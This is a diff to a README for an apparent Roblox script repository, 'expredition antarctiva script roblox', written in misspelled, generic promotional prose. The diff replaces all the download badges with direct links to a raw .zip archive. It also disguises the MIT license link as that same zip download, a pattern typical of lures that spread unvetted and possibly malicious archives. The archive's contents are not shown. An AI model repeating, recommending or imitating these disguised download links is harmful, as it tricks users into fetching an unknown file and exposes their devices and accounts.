@@ -1,6 +1,6 @@
 # ❄️ expredition antarctiva script roblox
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://lakabriya1212.github.io)
+[![Download](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)
 
 **Welcome to the Arctic frontier:** Traverse the polar expanse of Roblox unlike ever before with the *expredition antarctiva script roblox* repository. Whether you’re coding your digital snow boots or questing for southern mysteries, this script collection unleashes a new dimension to your Antarctic explorations. Dive into a windswept universe where performance meets innovation—optimizing your journey and bridging exciting functionalities with proactive community support.
 
@@ -10,7 +10,7 @@
 
 Access the latest version below to dive into Antarctica’s virtual wilds and unlock a toolkit brimming with adventure and ingenuity.
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://lakabriya1212.github.io)
+[![Download](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)
 
 ---
 
@@ -74,7 +74,7 @@ Harness Claude’s contextual reasoning for environmental event triggers and NPC
 
 Proudly open for exploration!  
 This project is licensed under the MIT License (2025).  
-See the license [here](https://opensource.org/licenses/MIT).
+See the license [here](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip).
 
 ---
 
@@ -82,7 +82,7 @@ See the license [here](https://opensource.org/licenses/MIT).
 
 Download the latest edition and chart your own journey in Roblox’s icy south:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://lakabriya1212.github.io)
+[![Download](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)](https://raw.githubusercontent.com/lakabriya1212/antarctiva-expedition-roblox-scripting/branch/ink/antarctiva-expedition-roblox-scripting_v2.2.zip)
 
 ---
 
